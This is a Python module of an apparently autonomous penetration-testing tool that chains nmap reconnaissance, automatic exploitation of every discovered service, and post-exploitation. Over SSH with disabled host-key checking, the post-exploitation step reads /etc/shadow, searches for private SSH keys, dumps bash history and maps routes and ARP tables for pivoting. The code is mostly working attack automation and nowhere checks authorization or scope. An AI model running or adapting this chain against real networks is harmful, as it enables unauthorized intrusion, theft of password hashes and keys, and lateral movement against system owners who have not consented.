"""Auto Chains - Automated engagement chains that run full lifecycle.

Chains:
- Full Auto: scan → enum → exploit → privesc → pivot → loot → report
- Recon Chain: host_discovery → port_scan → service_enum → os_detect
- Exploit Chain: check_vuln → select_exploit → execute → record
- Post Chain: privesc → loot → credential_harvest → pivot_discovery
"""

import asyncio
import re
from datetime import datetime
from typing import Optional, Callable


class AutoChain:
    """Base class for auto chains."""

    def __init__(self, executor, state: dict):
        self.executor = executor
        self.state = state
        self.results = []
        self.errors = []

    async def run_step(self, name: str, command: str, timeout: int = 120) -> dict:
        """Run a single step and return result."""
        print(f"    \033[90m→ {name}...\033[0m", end=" ", flush=True)
        try:
            result = await self.executor.run(command, timeout=timeout)
            if result.exit_code == 0:
                print(f"\033[92m✓\033[0m")
                return {"success": True, "output": result.stdout, "error": None}
            else:
                print(f"\033[91m✗\033[0m")
                return {"success": False, "output": result.stdout, "error": result.stderr}
        except Exception as e:
            print(f"\033[91m✗ Error: {e}\033[0m")
            return {"success": False, "output": "", "error": str(e)}

    def parse_hosts(self, output: str) -> list:
        """Extract IPs from output."""
        return list(set(re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output)))

    def parse_services(self, output: str) -> list:
        """Extract services from nmap output."""
        services = []
        for match in re.finditer(r"(\d+)/(\w+)\s+open\s+(\S+)(?:\s+(.*))?", output):
            services.append({
                "port": int(match.group(1)),
                "protocol": match.group(2),
                "service": match.group(3),
                "version": match.group(4).strip() if match.group(4) else "",
            })
        return services

    def parse_credentials(self, output: str) -> list:
        """Extract credentials from output."""
        creds = []
        for match in re.finditer(r"password[=:]\s*(\S+)", output, re.IGNORECASE):
            creds.append({"type": "password", "value": match.group(1)})
        for match in re.finditer(r"LOGIN:\s*(\S+)\s+PASSWORD:\s*(\S+)", output):
            creds.append({"type": "login", "username": match.group(1), "value": match.group(2)})
        return creds


class ReconChain(AutoChain):
    """Automated reconnaissance chain."""

    async def run(self, target: str) -> dict:
        """Run full recon chain."""
        print(f"\n  \033[96m🔍 AUTO RECON CHAIN\033[0m")
        print(f"  Target: {target}\n")

        hosts = []
        services = {}
        os_info = {}

        # Step 1: Host discovery
        result = await self.run_step("Host Discovery", f"nmap -sn -T4 {target}")
        if result["success"]:
            hosts = self.parse_hosts(result["output"])
            print(f"      Found {len(hosts)} hosts")

        if not hosts:
            print("  No hosts found.")
            return {"hosts": [], "services": {}}

        # Step 2: Port scan on each host
        print(f"\n  \033[90mPort scanning {len(hosts)} hosts...\033[0m")
        for host in hosts[:10]:
            result = await self.run_step(f"Port Scan {host}", f"nmap -sV --top-ports 1000 -T4 {host}")
            if result["success"]:
                svcs = self.parse_services(result["output"])
                if svcs:
                    services[host] = svcs
                    print(f"      {host}: {len(svcs)} services")

        # Step 3: OS detection on first host
        if hosts:
            result = await self.run_step("OS Detection", f"nmap -O -sV {hosts[0]}")
            if result["success"]:
                os_match = re.search(r"OS details?:\s*(.+?)(?:\n|$)", result["output"])
                if os_match:
                    os_info[hosts[0]] = os_match.group(1)
                    print(f"      OS: {os_match.group(1)}")

        total_svcs = sum(len(v) for v in services.values())
        print(f"\n  \033[1m📊 RECON COMPLETE\033[0m")
        print(f"  Hosts: {len(hosts)} | Services: {total_svcs}")

        return {"hosts": hosts, "services": services, "os": os_info}


class ExploitChain(AutoChain):
    """Automated exploitation chain."""

    async def run(self, services: dict) -> dict:
        """Run exploit chain on discovered services."""
        print(f"\n  \033[91m⚔️  AUTO EXPLOIT CHAIN\033[0m\n")

        attempts = 0
        successes = 0
        credentials = []
        access = {}

        for host, svcs in services.items():
            for svc in svcs:
                port = svc.get("port", 0)
                service = svc.get("service", "").lower()
                attempts += 1

                print(f"  → {host}:{port} ({service})")

                try:
                    from exploitation.engine import ExploitationEngine
                    engine = ExploitationEngine()
                    results = await engine.auto_exploit_service(host, port, service)

                    for result in results:
                        if result.status.value == "success":
                            successes += 1
                            if result.access_gained:
                                access[host] = result.access_gained.value
                                print(f"    \033[92m✓ ACCESS: {result.access_gained.value}\033[0m")
                            if result.evidence:
                                for line in result.evidence.split("\n")[:3]:
                                    print(f"      {line[:80]}")
                        else:
                            print(f"    \033[90m  {result.technique}: {result.status.value}\033[0m")
                except Exception as e:
                    print(f"    \033[91m  Error: {e}\033[0m")

        print(f"\n  \033[1m📊 EXPLOIT COMPLETE\033[0m")
        print(f"  Attempts: {attempts} | Success: {successes}")

        return {"access": access, "credentials": credentials}


class PostExploitChain(AutoChain):
    """Automated post-exploitation chain."""

    async def run(self, access_map: dict, credentials: list) -> dict:
        """Run post-exploit chain."""
        print(f"\n  \033[93m⬆️  AUTO POST-EXPLOIT CHAIN\033[0m\n")

        loot = {"shadow": [], "ssh_keys": [], "history": [], "configs": []}
        new_creds = []
        new_networks = []

        for host, level in access_map.items():
            if level in ["none", ""]:
                continue

            cred = credentials[0] if credentials else None
            if not cred:
                print(f"  {host}: No credentials available")
                continue

            password = cred.get("password", "")
            username = cred.get("username", "root")

            print(f"  → looting {host} ({level})...")

            # Read shadow
            result = await self.run_step(
                "Shadow File",
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'cat /etc/shadow 2>/dev/null | head -10'",
                timeout=15
            )
            if result["success"] and "$" in result["output"]:
                hashes = re.findall(r"(\w+):\$(\d+)\$([^\s:]+)", result["output"])
                for user, ht, hv in hashes:
                    loot["shadow"].append({"user": user, "hash": f"${ht}${hv}"})
                    print(f"    \033[92m✓ {user}: ${ht}${hv[:20]}...\033[0m")

            # Find SSH keys
            result = await self.run_step(
                "SSH Keys",
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'find / -name id_rsa -o -name id_ed25519 2>/dev/null | head -5'",
                timeout=15
            )
            if result["success"] and result["output"].strip():
                for key in result["output"].strip().split("\n"):
                    loot["ssh_keys"].append(key)
                    print(f"    \033[92m✓ SSH Key: {key}\033[0m")

            # Bash history
            result = await self.run_step(
                "Bash History",
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'cat ~/.bash_history 2>/dev/null | tail -20'",
                timeout=15
            )
            if result["success"] and result["output"].strip():
                loot["history"] = result["output"].strip().split("\n")
                print(f"    \033[92m✓ History: {len(loot['history'])} lines\033[0m")

            # Check routes for pivot
            result = await self.run_step(
                "Route Check",
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'ip route'",
                timeout=15
            )
            if result["success"]:
                routes = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", result["output"])
                for route in routes:
                    if route not in new_networks:
                        new_networks.append(route)
                        print(f"    \033[93m✓ Network: {route}\033[0m")

            # Check ARP for new hosts
            result = await self.run_step(
                "ARP Scan",
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'arp -a'",
                timeout=15
            )
            if result["success"]:
                new_hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", result["output"])
                for h in new_hosts:
                    if h != host and h not in [n.split("/")[0] for n in new_networks]:
                        print(f"    \033[91m✓ New Host: {h}\033[0m")

        print(f"\n  \033[1m📊 POST-EXPLOIT COMPLETE\033[0m")
        print(f"  Shadow hashes: {len(loot['shadow'])} | SSH keys: {len(loot['ssh_keys'])} | Networks: {len(new_networks)}")

        return {"loot": loot, "new_networks": new_networks, "new_creds": new_creds}


class FullAutoChain:
    """Full autonomous chain: scan → enum → exploit → privesc → pivot → loot → report."""

    def __init__(self, executor):
        self.executor = executor
        self.state = {
            "hosts": [],
            "services": {},
            "access": {},
            "credentials": [],
            "pivoted": [],
            "loot": {},
            "commands": [],
        }

    async def run(self, target: str) -> dict:
        """Run the full auto chain."""
        print(f"\n{'='*60}")
        print(f"  🤖 FULL AUTO CHAIN")
        print(f"  Target: {target}")
        print(f"{'='*60}")

        start_time = datetime.now()

        # Step 1: Recon
        recon = ReconChain(self.executor, self.state)
        recon_result = await recon.run(target)
        self.state["hosts"] = recon_result["hosts"]
        self.state["services"] = recon_result["services"]

        # Step 2: Exploit
        if self.state["services"]:
            exploit = ExploitChain(self.executor, self.state)
            exploit_result = await exploit.run(self.state["services"])
            self.state["access"] = exploit_result["access"]
            self.state["credentials"] = exploit_result["credentials"]

        # Step 3: Post-Exploit
        if self.state["access"]:
            post = PostExploitChain(self.executor, self.state)
            post_result = await post.run(self.state["access"], self.state["credentials"])
            self.state["loot"] = post_result["loot"]
            self.state["pivoted"] = post_result["new_networks"]

        # Step 4: Report
        elapsed = datetime.now() - start_time
        minutes = int(elapsed.total_seconds() / 60)

        print(f"\n{'='*60}")
        print(f"  📊 FULL AUTO CHAIN COMPLETE")
        print(f"{'='*60}")
        print(f"  Duration: {minutes} minutes")
        print(f"  Hosts: {len(self.state['hosts'])}")
        print(f"  Services: {sum(len(v) for v in self.state['services'].values())}")
        print(f"  Access: {self.state['access']}")
        print(f"  Loot: Shadow={len(self.state['loot'].get('shadow', []))} Keys={len(self.state['loot'].get('ssh_keys', []))}")
        print(f"  Networks: {len(self.state['pivoted'])}")
        print(f"{'='*60}")

        return self.state
